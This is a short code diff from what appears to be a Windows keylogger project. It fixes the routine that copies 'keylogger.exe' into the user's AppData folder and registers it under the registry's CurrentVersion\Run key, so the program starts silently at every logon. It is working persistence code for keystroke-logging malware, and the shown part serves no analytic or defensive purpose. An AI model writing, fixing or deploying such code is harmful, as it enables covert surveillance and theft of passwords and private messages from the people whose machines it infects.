@@ -140,12 +140,12 @@ def copy_script():
     src = 'dist\\keylogger.exe'
     dst = r'C:\Users\%s\AppData' % USER_NAME
     shutil.copy2(src, dst)
-    dst = 'C:\\Users\\"%s"\\AppData\\keylogger.exe' % USER_NAME  # name of script after making EXE
+    exePath = 'C:\\Users\\%s\\AppData\\keylogger.exe' % USER_NAME  # name of script after making EXE
     key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                          r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run', 0,
                          winreg.KEY_SET_VALUE)
-    winreg.SetValueEx(key, 'keylogger.exe', 0,
-                      winreg.REG_SZ, dst+'keylogger.exe')  # file_path is path of file after coping it
+    winreg.SetValueEx(key, 'keylogger', 0,
+                      winreg.REG_SZ, exePath)  # file_path is path of file after coping it
 
 
 copy_script()
